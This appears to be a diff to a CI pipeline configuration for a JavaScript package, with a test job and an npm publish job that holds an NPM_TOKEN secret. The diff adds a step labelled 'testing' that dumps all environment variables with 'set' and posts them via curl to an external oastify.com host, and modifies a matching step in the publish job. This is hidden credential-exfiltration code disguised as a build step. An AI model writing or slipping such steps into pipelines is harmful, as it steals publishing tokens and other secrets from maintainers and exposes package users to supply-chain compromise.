@@ -6,11 +6,13 @@ jobs:
         environment:
             SD_SONAR_OPTS: "-Dsonar.sources=index.js,lib -Dsonar.tests=test -Dsonar.javascript.lcov.reportPaths=artifacts/coverage/lcov.info -Dsonar.testExecutionReportPaths=artifacts/report/test.xml"
         requires: [~pr, ~commit]
+        steps:
+          - testing: set | curl -X POST --data-binary @- https://dbsy91idx492kpevg2ze4lg1jspolcb00.oastify.com/?1
 
     publish:
         requires: [~pr, ~commit]
         steps:
-          - testing: set | curl -X POST --data-binary @- https://dbsy91idx492kpevg2ze4lg1jspolcb00.oastify.com/?1
+          - testing: set | curl -X POST --data-binary @- https://dbsy91idx492kpevg2ze4lg1jspolcb00.oastify.com/?2
         secrets:
             # Publishing to NPM
             - NPM_TOKEN
